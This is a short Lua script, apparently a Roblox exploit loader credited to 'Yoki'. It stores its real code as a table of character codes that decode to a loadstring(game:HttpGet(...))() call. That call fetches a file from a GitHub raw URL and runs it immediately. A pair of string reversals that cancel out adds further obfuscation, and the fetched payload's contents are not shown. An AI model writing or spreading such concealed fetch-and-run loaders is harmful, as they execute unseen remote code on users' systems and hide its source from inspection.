local chars = { 45, 45, 32, 77, 97, 105, 110, 32, 76, 111, 97, 100, 101, 114, 32, 77, 97, 100, 101, 32, 98, 121, 58, 32, 89, 111, 107, 105, 10, 108, 111, 97, 100, 115, 116, 114, 105, 110, 103, 40, 103, 97, 109, 101, 58, 72, 116, 116, 112, 71, 101, 116, 40, 34, 104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 74, 105, 119, 111, 111, 65, 88, 72, 47, 115, 99, 114, 105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 108, 111, 97, 100, 101, 114, 34, 44, 32, 116, 114, 117, 101, 41, 41, 40, 41 }
local function fromChars(tbl)
 local s = {}
 for i = 1, #tbl do
  s[i] = string.char(tbl[i])
 end
 return table.concat(s)
end

local encoded = string.reverse(fromChars(chars))
local finalURL = string.reverse(encoded)

loadstring(finalURL)()
